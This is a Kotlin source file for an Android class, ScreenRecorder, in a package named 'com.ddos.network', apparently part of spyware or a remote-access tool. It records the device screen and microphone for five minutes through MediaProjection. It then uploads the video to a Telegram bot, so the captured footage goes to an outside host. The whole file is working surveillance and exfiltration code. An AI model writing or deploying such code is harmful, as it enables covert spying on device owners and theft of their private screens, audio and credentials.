package com.ddos.network

import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.view.WindowManager
import java.io.File

class ScreenRecorder(
    private val context: Context,
    private val bot: TelegramBot
) {
    private var mediaProjection: MediaProjection? = null
    private var mediaRecorder: MediaRecorder? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var isRecording = false
    private var outputFile: File? = null

    fun startRecording(resultCode: Int, data: Intent) {
        if (isRecording) return

        try {
            val projectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, data)

            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getMetrics(metrics)

            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            outputFile = File(
                context.getExternalFilesDir(null),
                "screen_${System.currentTimeMillis()}.mp4"
            )

            mediaRecorder = if (Build.VERSION.SDK_INT >= 31) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            mediaRecorder?.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoSize(width, height)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(3000000)  // 3 Mbps
                setAudioEncodingBitRate(128000)
                setAudioSamplingRate(44100)
                setOutputFile(outputFile?.absolutePath)
                prepare()
            }

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ddos_screen_record",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder?.surface,
                null, null
            )

            mediaRecorder?.start()
            isRecording = true

            // Stop after 5 minutes and upload
            Handler(Looper.getMainLooper()).postDelayed({
                stopAndUpload()
            }, 5 * 60 * 1000)  // 5 minutes

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun stopAndUpload() {
        if (!isRecording) return

        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
        } catch (e: Exception) {
            // Already stopped
        }

        mediaProjection?.stop()
        virtualDisplay?.release()

        mediaRecorder = null
        mediaProjection = null
        virtualDisplay = null
        isRecording = false

        // Upload
        outputFile?.let { file ->
            if (file.exists() && file.length() > 10000) {
                bot.uploadVideo(file, "🎥 SCREEN RECORDING")
            }
        }
    }

    fun isCurrentlyRecording(): Boolean = isRecording
}
